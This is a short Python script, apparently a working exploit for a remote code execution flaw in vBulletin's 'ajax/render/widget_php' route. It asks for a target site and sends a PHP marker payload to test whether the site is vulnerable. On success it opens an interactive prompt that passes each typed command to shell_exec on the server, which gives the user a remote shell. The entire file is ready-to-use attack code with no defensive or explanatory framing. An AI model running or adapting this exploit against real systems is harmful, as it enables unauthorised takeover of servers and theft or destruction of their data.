import requests as req
import sys,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

site = input("Enter Site: ")
params = {"routestring":"ajax/render/widget_php","widgetConfig[code]":"echo 'Monster007'; exit;"}

a = req.post(site,data=params,verify=False,timeout=5)
s = a.content.decode("latin1")

if "Monster007" in s and a.status_code == 200:
	while 1:
		cmd = input("$ ")
		if cmd == "exit":
			sys.exit()
		else:
			params = {"routestring":"ajax/render/widget_php","widgetConfig[code]":"echo shell_exec('" + cmd +"'); exit;"}
			exp = req.post(site,data=params,verify=False)
			print(exp.content.decode("latin1"),end="")
else:
	print("[+] Not Vulnerable")
